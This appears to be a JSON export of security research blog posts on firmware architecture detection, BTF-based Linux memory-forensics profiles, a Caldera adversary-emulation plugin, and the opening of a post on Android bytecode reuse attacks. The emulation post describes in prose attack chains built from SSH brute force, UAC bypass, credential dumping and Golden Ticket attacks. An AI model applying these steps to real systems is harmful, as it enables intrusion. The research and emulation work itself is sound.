[{"categories":null,"content":"Firmware reverse engineering comes with some unique challenges compared to the reversing of programs that run in the user space of some mainstream operating system. You will encounter one of them before Ghidra\u0026rsquo;s Code Browser even opens. Let\u0026rsquo;s illustrate it at a concrete example: I recently got myself some old Cisco devices off eBay as I was curious to have a look at their proprietary IOS operating system. However, when loading the IOS image into Ghidra1 you are greeted with the following screen:\nHm, what\u0026rsquo;s the processor architecture of this thing2? In this case it\u0026rsquo;s pretty easy to figure out the answer by googling the device or having a look at its PCB. However, in general it is not that simple. To illustrate this let\u0026rsquo;s throw unblob at the .firmware section of another IOS image that I pulled off an older device:\n% fd \u0026#39;.*?.bin$\u0026#39; 273704-297420.zip_extract/brisco_fw.uncomp.bin 297420-355662.zip_extract/et2_firmware.uncomp.bin 355664-426609.zip_extract/a.bin 426612-500306.zip_extract/hwic_fpga.bin 500308-618801.zip_extract/vws/dag/CPY-v124_22_t_throttle.V124_22_T5/vob/ios/sys/nms/pse/pse_sm_fpga.bin 618804-671957.zip_extract/vws/dag/CPY-v124_22_t_throttle.V124_22_T5/vob/ios/sys/firmware/pas/hifnhsp/obj/kontrol/flash.bin 671960-870333.zip_extract/vws/dag/CPY-v124_22_t_throttle.V124_22_T5/vob/ios/sys/firmware/pas/hifnhsp/obj/kontrol/hsp.bin 870336-925103.zip_extract/vws/dag/CPY-v124_22_t_throttle.V124_22_T5/vob/ios/sys/firmware/pas/hifnhsp/obj/kontrol/thaddeus_flash.bin 925104-1171822.zip_extract/vws/dag/CPY-v124_22_t_throttle.V124_22_T5/vob/ios/sys/firmware/pas/hifnhsp/obj/kontrol/thaddeus_hsp.bin Good luck figuring out what processor to select for each of those embedded blobs!\nWe have a great tool for that purpose, the Codescanner . It works very well. However, I have a longstanding problem with it. Besides that, it\u0026rsquo;s written in C++ and Python, and I think that everything, absolutely everything, should be written in Rust (and open source).\nSo, let\u0026rsquo;s write a tool that identifies processor instructions in binary blobs! Or is there anything more fun to do on a sunny weekend?\nNote: You can find the source code on GitHub .\nStatistics of Machine Code My core idea for the implementation is based on the cpu_rec tool by the awesome guys from Airbus Seclab3.\ncpu_rec\u0026rsquo;s detection mechanism is built around using different n-gram distributions (bigrams and trigrams) of the instruction bytes as a unique\u0026ldquo;fingerprint\u0026rdquo; of the corresponding processor. It computes these distributions for a ground truth corpus of code for about 80 different processors, and then compares them to the distributions of an unknown sample to determine its architecture.\nTo better understand how and why this works, let\u0026rsquo;s have a look at the trigram distributions of code for three popular embedded processors.\nEach data point corresponds to a trigram. The color-coding is according to the probability to observe the trigram (from low to high: grey, orange, red, green, blue). The exact mapping of intervals to colors does not matter here4, what does matter is that one can already see clear differences between the distributions with the bare eye.\nI could show similar plots for the bigram distribution, but we would not gain much from that. For bigrams there is a neat different way to interpret them: as conditional probabilities \\(P(B | A)\\) (given that you just observed byte \\(A\\), what is the probability that the next byte is \\(B\\)). We obviously loose some information by doing that transformation, but I still think it\u0026rsquo;s a good illustration of how much the statistics of machine code depend on the processor.\nThe plots show the conditional probabilities \\( P(B | A) \\) on the vertical axis, and the projection to the 2d plane at the bottom determines the pair (A, B). Orange points highlight cases where \\( P(B | A) = 0 \\). While one can vaguely see that the clouds of blue points have distinct features, clear differences are visible in the pattern of orange points at the bottom.\nFinding Instructions (and more) Given the main takeaway of the above section \u0026ndash; certain byte-level probability distributions can be used as the \u0026ldquo;fingerprint\u0026rdquo; of a processor \u0026ndash; all that is really left to do is to slice our target into pieces, compute the relevant distributions for each piece, and find the architecture with the \u0026ldquo;closest\u0026rdquo; distribution in the ground truth corpus.\nConcerning the choice for distributions (bigrams and trigrams) and\u0026ldquo;distance measure\u0026rdquo;5 (Kullback-Leibler divergence (KL), aka. cross-entropy) I decided to stick with cpu_rec\u0026rsquo;s choices for now. However, I guess one could experiment with other distributions and measures as well.\nLet\u0026rsquo;s try this approach (slicing the target into chunks and then computing KL of each chunk with everything in corpus) on two bootroms that I dumped from these Cisco devices I mentioned earlier.\nIn the above plots, each colored line corresponds to a CPU architecture. These lines \u0026ldquo;move along\u0026rdquo; the target file and their z-value is the KL of the arch\u0026rsquo;s ground truth distribution and the distribution that was observed at the corresponding offset in the target file. Red dots mark the best-fit (lowest) KL for each chunk of the target file and are annotated with the name of the corresponding architecture.\nJust by looking at those plots we can already get a pretty good idea of what is going on inside these ROMs. Unfortunately, if we look a bit closer, we will see that the naive detection is still a bit noisy. Fortunately, we still have some tricks up our sleeves that we can pull to reduce the noise level.\nIntuitively, there is a difference between an architecture being called because it is \u0026ldquo;clearly\u0026rdquo; the closest one for the chunk, or because it is just barely the best fit among many lines that are around the same level.\nWhat we are roughly looking for is something that captures the \u0026ldquo;statistical significance\u0026rdquo; of the detection result. My approach for that is currently to calculate the mean and variance of all the KLs in the range. Then, a detection via bigrams or trigrams is immediately significant if it is more than two standard deviations below the respective mean. If both detections are significant but disagree, preference is given to trigrams as I found them to be more reliable. If no detection meets the two-sigma criterion, we still make a call if both detections are lower than the mean minus one standard deviation and agree in their judgement. A final exception is made for the detection of ASCII text, here, a detection via trigrams within one sigma is enough, no matter what bigrams say.\nWith these additional heuristics in place, we get a relatively clean detection result.\nThose are the plots that I find the most useful in practice. There is a 1:1 correspondence between points in the plot and bytes in the file. A point\u0026rsquo;s x-coordinate is the byte\u0026rsquo;s file offset, the byte value is used as the y-coordinate, and coloring is used to encode the detection result of the chunk that the byte resides in.\nThis means we can now leave this tangent that we embarked upon and finally start analyzing this IOS image.\nAfter removing one layer of self-extracting archive.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSome IOS images are ELF files, however, the eh_machine entry is complete nonsense. For example, it\u0026rsquo;s \u0026ldquo;CDS VISIUMcore processor\u0026rdquo; for the example from the introduction.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThey really do a lot of awesome stuff for firmware analysis!\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWhat would be quite important are axis labels though \u0026hellip; but apparently the best Rust plotting library does not support that .\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCross-entropy is not a metric (distance function) in the mathematical sense.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://lolcads.github.io/posts/2024/11/coderec/","tags":["firmware reverse engineering","machine code detection","processor architecture detection","binary analysis","n-gram distributions"],"title":"coderec: Detecting Machine Code in Binary Files"},{"categories":null,"content":"This post is about some work that I did on automatic profile generation for memory forensics of Linux systems. To be upfront about it: This work is somewhat half-finished \u0026ndash; it already does something quite useful, but it could do a lot more, and it has not been evaluated thoroughly enough to be considered \u0026ldquo;production ready\u0026rdquo;. The reason I decided to publish it anyway is that I believe that there is an interesting opportunity to change the way in which we generate profiles for the analysis of Linux memory images in practice. However, in order for it to become a production tool, at least one outstanding problem has to be addressed (I have some ideas on that one) and lots of coding work needs to be done \u0026ndash; and I simply do not have the resources to work on that right now.\nNote: It has been a while since I actively worked on this project, so if someone else ran with this idea in the meantime, please let me know!\nNote: You can find the code of the prototype here .\nSo, what is this work about? To analyze memory images, we need profiles, usually those are generated from DWARF debug information, e.g., using tools like dwarf2json . However, here is the problem: DWARF is HUGE, so production kernels never ship with it; thus, it is highly unlikely that the kernel on the target whose memory we are analyzing includes them. Luckily, most (but not all!) Linux distributions provide debug-packages for their kernels. Consequently, a precondition for the generation of a profile is usually to figure out the distribution and exact version of the kernel in the image, and then to download the corresponding debug package.\nBut now comes the surprise: What if I tell you that virtually every production kernel that ships today comes with most of the information that we need to generate a profile for it? And that this information can be readily extracted from a raw memory image? Exploring this opportunity is what this work was all about.\nTo explain how and why this works, I\u0026rsquo;ll start by introducing the notion of a profile in memory forensics , state the problem that we strive to address , then talk about the BPF Type Format (BTF) , describe how BTF can be used to generate a part of a profile (+ an evaluation of our implementation ), discuss some open questions around symbols , and finally outline what needs to be done for this project to reach its full potential .\nLet\u0026rsquo;s get started!\nWhat\u0026rsquo;s a Profile? In short: A profile is a bunch of information that is used by analyses to make sense of the raw bytes in a memory image. In other words, it allows you to \u0026ldquo;bridge the semantic gap\u0026rdquo; between 1s and 0s in a dump and the answer to interesting questions like \u0026ldquo;Which network connections did the process that was stated at 13:37 made?\u0026rdquo;.\nUsually, a profile consists of two parts: Information about symbols and types of the kernel that was running on the machine. Symbols are what get you a foot in the door, i.e. where an analysis starts. For example, the head of the list of all tasks can be found via the init_task symbol. From there onward, the types are what allows an analysis to make sense of the raw bytes it finds, to transition between objects by following pointers, and eventually to extract useful information.\nSymbols are pretty simple, they are just names for memory locations together with the type of the data that is stored there. We will say that the triple of (name, location, type) forms a symbol.\nTypes are essentially recipes that tell you how to turn raw bytes back into a value of a C-type, i.e., they are a description of the memory layout of a C-type. We will say that the tuple (c_type_kind, c_type_name, memory_layout) forms a type.\nWhat\u0026rsquo;s the problem? The information in a profile is specific to a particular compilation of the operating system kernel, e.g., think of the linker’s freedom in arranging global variables or compile-time options that influence the layout of types. For Windows and macOS it is possible to build a profile database of all released kernels, i.e., you only have to find out which release you have in your dump and then you are ready to go. For Linux, there is a whole zoo of distros and even more kernel packages, a new one of which gets released every few days 1. Building a comprehensive Linux profile database is an endeavor that is doomed to fail.\nThere are reliable heuristics for inferring the release of the OS in your dump. Those work well for Windows, macOS and most Linux distros. However, the infeasibility of building a Linux profile database means that you must still use that information about the release to build the profile yourself. Usually this involves downloading the debug package of that exact release and running some tool against it. If this package does not exist, you are lost at that point. In particular this implies that you are completely lost if you are not analyzing a dump of a system running a mainstream Linux distro.\nSo, let\u0026rsquo;s get to the definition of the \u0026ldquo;profile generation problem\u0026rdquo;: Given only the bytes in a memory dump, tell me the symbols and types of the kernel that was running in there (maybe not all of them, but enough to do useful analyses).\nAre there existing solutions to this problem? Yes, plenty. There is like 1m of papers, some dating back many years, that identify and address this problem using all sorts of creative approaches, e.g., Oliveri et al. , Pagani et al. , Franzen et al. , Qi et al. , Cohen et al. , or Feng et al. .\nSeemingly, the \u0026ldquo;rule of the game\u0026rdquo; seems to be that you are allowed to do all sorts of up-front or on-demand analyses that involve the upstream Linux source code, and sometimes even on the live system, to support your analysis of the raw image. We\u0026rsquo;ll also need to make use of the former crutch to make our solution work.\nWhy yet another solution you may ask? Well, to the best of my knowledge, none of the proposed solutions has seen widespread adoption as of now. My hope is that the simplicity of our approach might mean that it can make generating profiles for images that meet certain requirements as easy as running a cli tool against it and waiting for a few seconds or so. No need to do some complicated setup, download tons of dependencies, compile a thousand Linux kernels with an aging clang fork, and to wait dozens of minutes or even hours for the profile to be finished - just download the binary and you are good to go 2. In short, our approach is less general, but hopefully more practical than previous work.\nWhat\u0026rsquo;s our solution? Meet The BPF Type Format (BTF)! You might have heard about BPF , if not, think of it as an abstract machine with its own bytecode format (a bit like the JVM or WASM). The Linux kernel has its own implementation of this abstract machine, the Linux BPF runtime, i.e., it can execute BPF bytecode programs. The whole point of this subsystem is to have a flexible, fast, safe, and portable way to extend the kernel at runtime. For example, I recently started using the opensnitch application-level firewall, and it is in fact enforcing its network policies via multiple BPF programs.\nWait, did you just say portable kernel extensions?!? But how can a program that is compiled to some assembly-like bytecode language and operates on kernel data structures in memory be portable across kernel versions? After all code like:\nstruct my_struct { #ifdef BAR long bar; #else long foo; } long read_foo(struct my_struct* x) { return my_struct-\u0026gt;foo; } should be compiled down to instructions that have things like \u0026ldquo;Is a long 4 or 8 bytes?\u0026rdquo; or \u0026ldquo;Was BAR defined?\u0026rdquo; hard coded inside them. The solution to this apparent paradox lies in the interplay of four components: the preserve-access-index C-language attribute , the compiler toolchain, the user-space dynamic loader, and the kernel that the program should be loaded into.\nIn the program\u0026rsquo;s C source code, structures/unions whose member accesses should be portable must be marked with the preserve-access-index attribute 3. The compiler will then generate the accessing code without hard-coded offsets and record which field of which type was accessed at a particular location in relocation information . This information is processed by the user-space dynamic loader running on the target system, which adjusts the program to the layout of types in the running kernel before loading it. The information about memory layout of types is supplied by the running kernel itself via the files in the /sys/kernel/btf/ pseudo file system.\nWhaaat? Each and every kernel out there that wants to support portable BPF programs (pretty much every single one) must ship with a description of the memory layout of all its types? That\u0026rsquo;s like having Christmas and your birthday together! Indeed, the relevant information is stored in the .BTF sections of the kernel and module ELF files in the well documented BPF Type Format .\nThis solves the whole types part of the \u0026ldquo;profile-generation-problem\u0026rdquo; for most modern kernels without the need for a debug build. Furthermore, since the kernel image is contiguous in physical memory, it is straight forward to carve the section from a memory image.\nNote: The reason why it is feasible to include the BTF information in production kernels is since it is much smaller than DWARF debug information. In part, this is achieved by the format being much less wasteful with disk space, however, it is also fundamentally less expressive. Thus, it is a priori not clear that BTF contains all the type information needed by memory forensics analyses. It was part of this work to establish that this is indeed the case (not too surprising given BTF\u0026rsquo;s original use case described above). I recommend this post for an introduction to the BTF format and its relationship to DWARF.\nNote: BTF has been around for quite a while, since Linux 4.18 to be precise, so it is not like you will only find it in bleeding edge kernels.\nWhat we have! Let\u0026rsquo;s start with the good news: the released prototype btf2json can generate working Volatility3 profiles! At the time of our evaluation, those profiles were even \u0026ldquo;better\u0026rdquo; than the ones generated by dwarf2json, in the sense that they supported more analyses on more memory images. It is also worth noting that the profile generation is about 10x faster.\nCurrently, btf2json accepts either an ELF vmlinux image or a raw .BTF-section for the type information, as well as a System.map file for symbol information, to generate a Volatility3 profile.\n$ btf2json --help Generate Volatility 3 ISF files from BTF type information Usage: btf2json [OPTIONS] Options: --btf \u0026lt;BTF\u0026gt; BTF file for obtaining type information (can also be a kernel image) --map \u0026lt;MAP\u0026gt; System.map file for obtaining symbol names and addresses --banner \u0026lt;BANNER\u0026gt; Linux banner. Mandatory if using a BTF file for type information. Takes precedence over all other possible sources of banner information. --version Print btf2json version --verbose Display debug output --debug Display more debug output --image \u0026lt;IMAGE\u0026gt; Memory image to extract type and/or symbol information from (not implemented) -h, --help Print help (see a summary with \u0026#39;-h\u0026#39;) $ btf2json --btf path/to/vmlinux/or/btf/section --map path/to/system/map # prints ISF to stdout Note: If you use just the .BTF-section for type information, you also need to provide a Linux banner so that Volatility can match the profile to a memory image.\nThe resulting profile can then be used to drive Volatility analyses, just like any other profile that you would have previously generated with dwarf2json.\nIn its current form, btf2json already has one key advantage over dwarf2json (besides being much faster :P): no need for debug kernels! This means you can generate profiles for custom, self-compiled kernels (useful when investigating nerds like me) or distributions that do not provide kernel debug symbols (e.g., Arch Linux). Furthermore, you do not have to bother with figuring out the exact kernel release and searching the corresponding debug package in a gigantic repository. Just grab the vmlinux and System.map from the file system and you are good to go!\nEvaluation We evaluated btf2json on the following kernels:\nAlmalinux 9 kernel: 5.14.0-362.8.1.el9_3.x86_64 (f844e) Archlinux kernel: 6.6.7-arch1-1 (59a42) kernel: 6.11.6-arch1-1 (a54bd) Fedora 38 kernel: 6.6.6-100.fc38.x86_64 (85565) Fedora 39 kernel: 6.6.6-200.fc39.x86_64 (7bd7a) kernel: 6.11.6-100.fc39.x86_64 (d2be6) Fedora 40 kernel: 6.11.6-200.fc40.x86_64 (bbbb3) Centos 9s kernel: 5.14.0-391.el9.x86_64 (20d08) Debian 11 kernel: 5.10.0-26-amd64 (2c41e) Rocky 8 kernel: 4.18.0-513.9.1.el8_9.x86_64 (9a6e2) Ubuntu 22.04 kernel: 5.15.0-88-generic (6f76f) Ubuntu 23.10 kernel: 6.5.0-10-generic (ccbb5) Kali Rolling kernel: 6.11.2-amd64 (c0965) For each kernel, we\nused dwarf2json (with normal kernel + system map) and btf2json (with debug kernel + system map) to generate a profile (we also measured the time this took the tools), booted the kernel in a VM, took a memory snapshot of the VM, ran all upstream Volatility3 Linux analysis plugins on the memory image, with the debug output cranked up to the highest level. For each analysis the\nexit code, stdout stream, stderr stream, were saved.\nWe then compared the exit codes, and diffed the stdout and stderr streams, of the analysis plugins with the dwarf2json and btf2json profiles, respectively. Cases where the exit code and/or the stdout/stderr streams differed were manually investigated.\nIn total, we evaluated 32 analysis plugins on memory images of 13 different kernels, resulting in a total of 416 unique pairs of memory image and analysis plugin.\nIn 394 cases the exit codes of the plugins running with the btf2json- and dwarf2json-generated profiles were identical. In 9 cases the btf2json profile lead to a successful analysis while the analysis with the dwarf2json profile failed. This was the case for the linux.capabilities.Capabilities plugin on all images but Fedora, Ubuntu 23.10, Kali and Archlinux (5 images), and for the linux.check_syscall.Check_syscall plugin on Fedora (4 images). In 13 cases the analysis failed with both plugins. This was the case for the linux.vmayarascan.VmaYaraScan plugin on all images. We tracked the reason for the failure of the linux.capabilities.Capabilities analysis with the dwarf2json profiles down to the fact that they assigned the kernel_cap_t type for the capabilities in struct cred while btf2json assigned the struct kernel_cap_struct type. While those are in fact related via a typedef, the Volatility3 framework differentiates between them in their implementation to obtain the capability bits. In particular, Volatility uses this distinction to differentiate between pre and post 6.3 kernels (which is why it works on Fedora, Ubuntu, Kali, and Arch), so we believe that there is a bug in the interplay of dwarf2json-profiles and Volatility on older kernels.\nConcerning the failure of the linux.check_syscall.Check_syscall plugin on Fedora, we did not perform an in-depth investigation, however, it seems to be due to issues in the type information of the dwarf2json profile. With the btf2json profile the system call table is correctly extracted.\nFinally, the linux.vmayarascan.VmaYaraScan counts as a failure since it throws an exception if no rules are given.\nApart from the 9 cases where only the btf2json analysis was successful, the stdout streams of the analyses were identical. On the stderr streams, we observed slight differences in the DEBUG-level log messages that hint at differing inconsistencies in the type information of the profiles (volatility3.framework.symbols: Unresolved reference: messages). On average, running all analyses over an image with the btf2json profile reports 65 unique inconsistencies, whereas a run with the dwarf2json profile detects 90 such inconsistencies.\nWith regards to the average runtime, our evaluation showed that the profile generation of btf2json (1.54s) is significantly faster than that of dwarf2json (18.5s), i.e., we see a 12x speedup.\nNote: For the evaluation, we used Volatility3 at commit a00a59cd235cb18b7dc28ccf2669e2a82368fab5, btf2json at commit 18bd9d1015a7433a85ac2634a7a4f34f6d04c851, and dwarf2json at commit 9f14607e0d339d463ea725fbd5c08aa7b7d40f75.\nSymbols Are Only Partially Solved Sounds great, right? Well, unfortunately I must admit that btf2json has a dirty secret: the symdb.\nRecall that we defined a symbol as the triple of (name, location, type). We can get the names and locations from the System.map. However, while BTF is technically able to encode the types of global variables via the BTF_KIND_VAR and BTF_KIND_DATASEC entries, this is only done for the 400ish per-CPU variables. This leads us to our problem: How do we assign types to symbols?\nLet\u0026rsquo;s take a step back and ask ourselves why we even need the type as part of our definition of a symbol. Symbols are usually the \u0026ldquo;entry point\u0026rdquo; for an analysis. Think of an analysis that lists all tasks, it will usually start at the init_task symbol, and then traverse the dynamically allocated doubly linked list that hangs off it. This stage of \u0026ldquo;getting a foot into the door\u0026rdquo; is where the type of a symbol is needed, and in my experience each analysis is only using a handful of symbols for that purpose.\nTherefore, we decided to measure for which symbols their types are accessed by the existing Volatility analyses. To do so we instrumented the method responsible for retrieving the type of a symbol and re-ran all analyses. We found that 32, of the 150k+, unique symbols have their type accessed. See the Appendix for a list of those symbols .\nAs we can see, it is only a tiny fraction of the 150k+ symbols that exist in a Linux kernel.\nThis leads me to a bold claim: It is feasible to build and maintain a map ([kernel m.m.p version], symbol name) -\u0026gt; (type name) that works in practice.\nI believe that this works for three reasons:\nThe subset of symbols that are actually used by analyses is fairly small. The type names of these symbols are very stable between kernel versions. The type names of these symbols do not depend on build-time configuration options. We call this mapping symdb and embed it into the final, stand-alone btf2json executable. Thus, under the above assumptions, btf2json can generate working profiles just from a kernel\u0026rsquo;s BTF information and System.map.\nNote: This solution is, in general, inferior to what dwarf2json does. The symdb will contain missing or wrong entries. I just believe that the entries that matter will be correct due to the above considerations.\nNote: Currently the symdb is a mapping (symbol name) -\u0026gt; (type name) generated of some kernel I had laying around (and it still works fine for Linux 4.18-6.11!!!). Generating a proper symdb and rigorously evaluating the approach is part of the future work outlined below.\nCall to Action Now, as I said above, I consider this work to be in a half-finished-but-usable state. It can already bring a real benefit to the community, but it is far from reaching its full potential. Thus, here is my vision of what btf2json could become through the investment of considerable time and energy (which I currently do not have). If the community decides that it is a goal worth pursuing, I am confident that we can get there.\nWorking on a Raw Memory Image Recall that the ultimate goal of automatic profile generation is to generate the profile off a raw memory image. For that to work we would roughly need to add the following things:\nCarve the banner from the image (conceptually trivial, little work). Carve the .BTF section from the image (conceptually simple, little to medium work). Scanning for the magic bytes 0xeb9f and performing some heuristic checks on matches is sufficient, we already prototyped and evaluated this. Extract kallsyms from the image, either using a carving approach like vmlinux-to-elf (conceptually simple, loooots of work), using an emulation approach like academic papers (conceptually advanced, medium work). This introduces some big dependencies that make shipping a stand-alone cross-platform executable hard. Note: kallsyms in memory may contain the addresses with ASLR offsets while the System.map has an ASLR-slide of zero. One would either need to find a way to adjust them or teach Volatility to work with \u0026ldquo;real\u0026rdquo; addresses, which would tie the profile to a particular image. I have a rough idea how to do the former: scan for swapper as usual, transition to its root page tables via symbol information, reconstruct page tables and read off slide of kernel region.\nNote: This obviously only works for kernels compiled with KALLSYMS=y.\nEvaluating the symdb Approach Currently, everything around the symdb is more or less just me eyeballing based on my (limited) experience that \u0026ldquo;this stuff should probably work\u0026rdquo; and our small-scale evaluation. Anyway, we need to actually implement and evaluate this for real!\nBuilding and automatically maintaining the symdb as it was described above (conceptually difficult, lots of work). For this we need at the very least the preprocessed C code but working with LLVM IR would be a lot nicer. Then, the extraction of type names for all global symbols is possible for the C code and easy for the LLVM IR. One issue I already see is that to get the preprocessed C code one needs to make choices for all configuration options, and the set of symbols depends on those options - some sort of compromise will be needed here. Evaluating the symdb and its underlying assumptions (conceptually simple, medium work). By using DWARF as ground truth, it should be rather straightforward to evaluate the correctness of the symdb mapping. That\u0026rsquo;s it, thanks for reading!\nAppendix A: Accessed Symbols List of all symbols whose type is queried when running all Volatility3 analysis plugins. This data was generated by instrumenting the get_type method of the SymbolInterface.\nNote: We excluded linux.check_syscall.CheckSyscall as this plugin iterates over (all) symbols and calls get_symbol which, accesses the type for caching purposes. However, it does not use the type information.\n__sched_class_highest __sched_class_lowest _etext _text cap_last_cap dl_sched_class fair_sched_class idle_sched_class idt_table init_files init_mm init_pid_ns init_task iomem_resource keyboard_notifier_list mod_tree module_kset modules net_namespace_list prb prog_idr rt_sched_class socket_file_ops sockfs_dentry_operations stop_sched_class tcp4_seq_afinfo tcp6_seq_afinfo tty_drivers udp4_seq_afinfo udp6_seq_afinfo udplite4_seq_afinfo udplite6_seq_afinfo Not to mention all the self-compiled kernels that do not have publicly available binary packages at all.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSorry Windows users, no pre-compiled binaries for you – WSL for the win!\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAlternatively, a portable program can make use of compiler built-ins that can be combined to achieve the same effect, but allow it to do even crazier things, like testing whether a field of an enum exists. I recommend reading this post if you are interested in learning more about the mechanics of portable programs.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://lolcads.github.io/posts/2024/11/btf2json/","tags":["Linux","Kernel","BTF","Forensics"],"title":"Towards utilizing BTF Information in Linux Memory Forensics"},{"categories":null,"content":"Cyber Adversary Emulation Cyber adversary emulation is an assessment method where tactis, techniques, and procedures (TTPs) of real-world attackers are used to test the security controls of a system. It helps to understand how an attacker might penetrate defenses, to evaluate installed security mechanisms and to improve the security posture by addressing identified weaknesses. Furthermore, it allows running training scenarios for security professionals, e.g., in cyber ranges where practical exercises can be performed. Unfortunately, adversary emulation requires significant time, effort, and specialized professionals to conduct.\nCyber Adversary Emulation Tools In order to reduce the costs and increase the effectiveness of security assessments, adversary emulation tools can be used to automate the emulation of real-world attackers. Also, such tools include built-in logging and reporting features that simplify documenting the assessment. Thus, assessments become more accessible for less experienced personnel and more resource-efficient when using adversary emulation tools. But the automation process also has drawbacks, e.g., they often depend on predefined playbooks resulting in limited scenario coverage, a lack of adaptability, and a high predictability. As a consequence, simulated attacks fail more often and trainee personnel might recognize an attacker from previous scenarios, resulting in a lower quality in training experience.\nIntroducing Caldera and its Decision Engine Caldera is an open-source, plugin-based cybersecurity platform developed by MITRE that can be used to emulate cyber adversaries. It does not depend on playbooks as strongly as other adversary emulation tools do - instead it uses adversary profiles and planners. While adversary profiles contain attacks steps to execute, the planners are unique decision logics that decide if, when, and how a step should be executed. Even though Caldera comes with several planners out-of-the-box, it still has some limitations: (1) Repeating a scenario results in the same behavior since the planners make deterministic decisions, (2) only post-compromise methods are supported, and (3) simulated attack behavior can be unrealistic due to planner limitations. To overcome these limitations, we developed and implemented a new plugin for Caldera - the Bounty Hunter.\nThe Bounty Hunter The Bounty Hunter is a novel plugin for Caldera. Its biggest asset is the Bounty Hunter Planner that allows the emulation of complete, realistic cyberattack chains. Bounty Hunter\u0026rsquo;s key features are:\nWeighted-Random Attack Behavior. The Bounty Hunter\u0026rsquo;s attack behavior is goal-oriented and reward-driven, similar to Caldera\u0026rsquo;s Look-Ahead Planner. But instead of picking the ability with the highest future reward value every time, it offers the possibility to pick the next ability weighted-randomly. This adds an uncertainty to the planner\u0026rsquo;s behavior which allows repeated runs of the same operation with different results. This is especially useful in training environments. Support for Initial Access and Privilege Escalation. At the moment, no Caldera planner offers support for initial access or privilege escalation methods. The Bounty Hunter extends Caldera\u0026rsquo;s capabilities by offering support for both in a fully autonomous manner. This enables it to emulate complete cyberattack chains. Further Configurations for More Sophisticated and Realistic Attack Behavior. The Bounty Hunter offers various configuration parameters, e.g., \u0026ldquo;locking\u0026rdquo; abilities, reward updates, and final abilities, to customize the emulated attack behavior. The following two sections introduce two example scenarios to showcase the capabilities of the Bounty Hunter. The first example describes how it emulates complete cyberattack chains, including initial access and privilege escalation. In the second scenario, the Bounty Hunter is tasked to emulate a multistep attack based on an APT29 campaign to demonstrate the level of complexity that it can achieve.\nScenario #1 - Initial Access and Privilege Escalation This example scenario demonstrates how the Bounty Hunter is able to perform initial access and privilege escalation autonomously. The results of the demo operation using the Bounty Hunter and a demo adversary profile are shown in the picture below. The operation is started with a Caldera agent (yjjtqs) running on the same machine as the Caldera server, i.e., a machine that is already controlled by the adversary.\nAs first step, the Bounty Hunter executes a Nmap host scan to find potential targets, followed by a Nmap port scan of found systems to gather information about them. Depending on the gathered port as well as service and version information, an initial access agenda is chosen and executed. In this scenario, the emulated adversary found an open SSH port and decides to try an SSH brute force attack. It successfully gathers valid SSH credentials and uses them to copy and start a new Caldera agent on the target machine (ycchap). Next, the Bounty Hunter detects that it needs elevated privileges for its chosen final ability (Credential Dumping) and decides to start a privilege escalation by running a UAC Bypass. As a result of this step, a new elevated agent was started (ebdwxy) and the final ability can be executed, concluding the operation.\nExample operation to demonstrate Initial Access and Privilege Escalation with the Bounty Hunter and a demo adversary profile. Note how three different agents are used during the different phases. Scenario #2 - Emulating an APT29 Campaign The level of complexity the Bounty Hunter supports was tested using the APT29 Day2 data from the adversary emulation library of the Center for Threat Informed Defense. The resulting attack chain including fact-links between steps is shown in the figure below. The test showed that the Bounty Hunter is able to initially access a Windows Workstation using SSH brute force, elevate its privileges automatically using a Windows UAC Bypass, and finally compromise the whole domain using a Kerberos Golden Ticket Attack.\nTo achieve its goal, the Bounty Hunter was only provided with a high reward of the final ability that executes a command using the Golden Ticket and the name of the interface to scan initially. All other information needed for the successful execution, including the domain name, domain admin credentials, SID values, and NTLM hashes, were collected autonomously.\nExample operation to demonstrate the level of complexity the Bounty Hunter supports based on an APT29 campaign. During the campaign, a Windows Active Directory Domain is compromised by running a Kerberos Golden Ticket Attack. Configuration of the Bounty Hunter The Bounty Hunter can be configured in various ways to further customize the emulated attack behavior. Possible configurations range from custom ability rewards, over final and locked abilities to custom ability reward updates. For detailed information on the configuration possibilities, please refer to the description in the GitHub repository .\nConclusion Cyber adversary emulation is complicated and different approaches suffer from different drawbacks. Common challenges of cyber adversary emulation tools (such as the well-known cybersecurity platform Caldera) are their predictability and limitations in their scope. To overcome these challenges, we developed and implemented a new Caldera plugin - the Bounty Hunter. The capabilities of the Bounty Hunter were demonstrated in two different scenarios, showing that it is capable of emulating initial access and privilege escalation methods as well as handling complex, multistep cyberattack chains, e.g., an attack based on an APT29 campaign.\nThe Bounty Hunter is released open-source on GitHub with (deliberately unsophisticated) proof-of-concept attacks for Windows and Linux targets.\n","permalink":"https://lolcads.github.io/posts/2024/09/bountyhunter/","tags":["Adversary Emulation","Caldera","Cybersecurity"],"title":"Adversary Emulation is a Complicated Profession - Intelligent Cyber Adversary Emulation with the Bounty Hunter"},{"categories":null,"content":"Bytecode Reuse Attack (Part 4) As last blog post on bytecode - based exploitation on Android, the next step following bytecode injection is discussed, namely: bytecode reuse.\nTo answer the question about why an attacker needs bytecode reuse, although there already is bytecode injection, remember the arms race in (binary) exploitation. In a nutshell, a new exploitation technique triggers a reaction in form of at least one security mechanism that (partially) mitigates the new technique. If only bytecode injection was researched, then the best response would be the development of a new security mechanism that prevents nterp from executing arbitrary data. In other words, nterp would be restricted to executable code, i.e. bytecode. To be honest, every developer would respond with such a fix, myself included! However, bytecode injection is not the full potential of bytecode - based exploitation.\nTherefore, the core idea is to provide enough information on bytecode - based exploitation to be able to understand its implications on security and maybe design fitting mitigations. In terms of the below visualization, instead of filling in the left mountain one by one, providing more research results on bytecode - based exploitation may enable the creation of a batch of security mechanisms. Notice that the below illustration shows a kind of security deception: the security level of an app in the presence of a memory error is the minimum of the security levels of all interpreters. As nterp is not protected at all except by side effects of e.g. ASLR, the presence of strong native - level security mechanisms may give a false sense of security. Later on, after the bytecode reuse attack is somewhat understood, a few mitigation attempts are discussed. However, practical mitigations are yet to be found!\nBefore we delve into bytecode reuse attacks on Android, just a heads up:\nDisclaimer: Bytecode reuse is the most complicated exploitation technique in this series of blog posts. To derive it, we draw from various fields in offensive security. Hence, this post is very technical and one of the harder posts to digest.\nAssumptions For simplicity, we assume an attacker is able to trick a victim into installing and runnning an unprivileged app. I.e. in this blog post, next to bytecode reuse, the potential security impact of Android\u0026rsquo;s fork server architecture is investigated via a local attacker. While a successful remote attacker shows a much greater impact 